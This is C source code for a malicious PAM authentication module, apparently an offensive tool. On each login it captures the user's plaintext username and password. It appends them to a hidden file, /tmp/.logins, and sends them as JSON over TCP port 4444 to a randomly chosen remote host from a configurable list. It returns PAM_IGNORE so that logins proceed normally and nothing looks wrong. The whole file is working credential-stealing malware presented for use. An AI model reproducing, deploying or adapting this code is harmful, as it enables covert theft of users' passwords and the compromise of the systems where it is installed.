/* Define which PAM interfaces we provide */
// Note: we'll probably want these later when we hook password changes
//#define PAM_SM_ACCOUNT
#define PAM_SM_AUTH
//#define PAM_SM_PASSWORD

#define LOCAL_FILE "/tmp/.logins"
#define PORT "4444"

#include "frozen.h"
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
/* Include PAM headers */
#include <security/pam_appl.h>
#include <security/pam_modules.h>

const char *hosts[] = {};

void send_credentials(const char *, const char *, const char *);
void write_credentials(const char *, const char *, const char *);

const char *choose_host() {
  srand(time(0));
  size_t elements = sizeof(hosts) / sizeof(hosts[0]);
  return hosts[rand() % elements];
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc,
                        const char **argv) {
  const char *username = NULL;
  const char *password = NULL;

  if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS || username == NULL) {
    return PAM_IGNORE;
  }

  if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password) !=
      PAM_SUCCESS) {
    return PAM_IGNORE;
  }

  // bail out if we're not the child process
  if (fork() > 0) {
    return PAM_IGNORE;
  }

  write_credentials("login", username, password);
  send_credentials("login", username, password);

  return PAM_IGNORE;
}

// NOTE: These aren't used but this is where we'll handle password changes
/*
   PAM entry point for setting user credentials (that is, to actually
   establish the authenticated user's credentials to the service provider)
 */
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_IGNORE;
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc,
                     const char **argv) {
  return PAM_IGNORE;
}

void send_credentials(const char *action, const char *username,
                      const char *password) {
  const char *host = choose_host();
  struct addrinfo *result;
  int sockfd;

  char buf[1024] = "";

  struct json_out out = JSON_OUT_BUF(buf, sizeof(buf));
  json_printf(&out, "{%Q: %Q, %Q: %Q, %Q: %Q}\n", "action", action, "username",
              username, "password", password);

  if (getaddrinfo(host, PORT, NULL, &result) != 0) {
    return;
  }

  if ((sockfd = socket(result->ai_family, SOCK_STREAM, 0)) == -1) {
    freeaddrinfo(result);
    return;
  }

  if (connect(sockfd, result->ai_addr, result->ai_addrlen) == -1) {
    freeaddrinfo(result);
    close(sockfd);
    return;
  }

  for (int total_sent = 0; total_sent < out.u.buf.len;) {
    int sent =
        send(sockfd, out.u.buf.buf + total_sent, out.u.buf.len - total_sent, 0);
    if (sent == -1) {
      break;
    }

    total_sent += sent;
  }

  freeaddrinfo(result);
  close(sockfd);
  return;
}

void write_credentials(const char *action, const char *username,
                       const char *password) {
  FILE *fp;
  if ((fp = fopen(LOCAL_FILE, "a")) == NULL) {
    return;
  }

  fprintf(fp, "%s(%s:%s)\n", action, username, password);
  fclose(fp);
}